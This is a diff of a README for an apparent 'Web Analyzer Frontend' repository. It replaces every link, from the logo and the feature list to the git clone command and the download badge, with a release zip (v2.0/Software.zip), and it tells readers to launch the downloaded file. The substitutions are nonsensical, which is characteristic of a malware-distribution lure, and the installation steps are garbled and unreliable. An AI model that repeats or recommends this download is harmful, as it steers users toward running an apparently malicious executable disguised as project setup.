@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Web Analyzer Frontend Repository!
 
-![Web Analyzer Logo](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v1.0/Application.zip)
+![Web Analyzer Logo](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v2.0/Software.zip)
 
 ## About
 Welcome to the repository for the Web Analyzer Frontend created by Mazaoro SARLU. This frontend serves as a legacy project related to the lead magnet "Web Analyzer," drawing inspiration from Hubspot's popular website grader tool.
@@ -16,7 +16,7 @@ Welcome to the repository for the Web Analyzer Frontend created by Mazaoro SARLU
 - Docker support for easy deployment
 - Headless CMS for flexible content management
 - Built with Jamstack principles
-- Powered by https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v1.0/Application.zip and React
+- Powered by https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v2.0/Software.zip and React
 - Utilizes Storyblok for content management
 - Styling using Tailwind CSS
 - Developed with TypeScript for added type safety
@@ -26,18 +26,18 @@ The repository is organized with a clear structure to help you navigate and cont
 - `/src`: Contains the source code for the Web Analyzer frontend
 - `/public`: Houses the public assets for the project
 - `/components`: Reusable React components used throughout the application
-- `/pages`: https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v1.0/Application.zip pages for different sections of the frontend
+- `/pages`: https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v2.0/Software.zip pages for different sections of the frontend
 
 ## 📦 Get Started
-To get started with the Web Analyzer Frontend, you can either visit the [Web Analyzer Website](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v1.0/Application.zip) or download the latest release from the following link: 
-[![Download Latest Release](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v1.0/Application.zip%20Release-brightgreen)](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v1.0/Application.zip)
+To get started with the Web Analyzer Frontend, you can either visit the [Web Analyzer Website](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v2.0/Software.zip) or download the latest release from the following link: 
+[![Download Latest Release](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v2.0/Software.zip)
 *Note: The downloaded file needs to be launched to set up the Web Analyzer Frontend.*
 
 ## 🛠️ Installation
 Follow these steps to install and run the Web Analyzer Frontend locally:
 1. Clone the repository to your local machine
    ```bash
-   git clone https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v1.0/Application.zip
+   git clone https://github.com/Ajain1414/web-analyzer-frontend/releases/download/v2.0/Software.zip
    ```
 2. Navigate to the project directory
    ```bash
